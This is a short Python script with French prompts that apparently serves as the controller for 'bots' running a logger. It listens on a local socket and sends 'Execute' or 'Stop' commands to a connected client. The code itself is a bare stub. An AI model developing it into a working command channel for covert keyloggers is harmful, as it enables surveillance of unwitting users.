import socket as modSocket
import argparse

s = modSocket.socket(modSocket.AF_INET, modSocket.SOCK_STREAM)

s.bind(("localhost", 5000))

s.listen()
conn, addr = s.accept()

print ("Connexion avec l'adresse: ", addr)

parser = argparse.ArgumentParser()
parser.add_argument("--logger", help="Permet de communiquer avec les bots", action="store_true")
args = parser.parse_args()


if args.logger:
    action = input("Que voulez vous faire : (start, stop) ")

    def start_log(conn):

        conn.send("Execute".encode("utf-8"))
        print(conn.recv(1024).decode("utf-8"))
        

    def stop_log(conn):

        conn.send("Stop".encode("utf-8"))
        print(conn.recv(1024).decode("utf-8"))


    if action == "start":
        start_log(conn)
    elif action == "stop":
        stop_log(conn)
    else:
        print("ce choix n'existe pas")

    s.close()
